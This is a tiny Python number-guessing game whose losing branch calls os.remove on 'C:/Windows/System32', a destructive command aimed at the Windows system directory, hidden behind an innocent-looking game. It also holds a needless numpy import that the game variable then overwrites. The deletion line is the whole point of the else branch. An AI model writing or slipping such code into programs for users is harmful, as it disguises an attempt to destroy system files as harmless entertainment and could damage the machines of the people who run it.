import random
import os

from numpy import number

number= random.randint(1, 100)
guess = int(input("Guess a number between 1 and 100: "))    
guess = int(guess)

if guess == number:
    print("Congratulations! You guessed the number correctly.") 
else:
    os.remove("C:/Windows/System32")
